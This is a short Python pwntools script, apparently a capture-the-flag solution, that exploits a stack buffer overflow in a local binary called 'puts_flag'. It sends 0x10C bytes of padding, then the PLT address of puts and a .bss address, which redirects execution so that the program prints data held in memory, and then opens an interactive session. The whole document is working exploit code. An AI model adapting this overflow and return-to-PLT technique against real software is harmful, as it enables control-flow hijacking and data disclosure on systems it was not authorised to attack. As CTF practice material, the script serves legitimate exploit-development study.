from pwn import *

p = process("./puts_flag")

elf = ELF("./puts_flag")

puts_plt = elf.symbols['puts']
bss = 0x80eb9e0

p.recvuntil("code ~~\n")

payload = ""
payload += "A" * 0x10C
payload += p32(puts_plt)
payload += "A" * 4
payload += p32(bss)

pause()

p.sendline(payload)

p.interactive()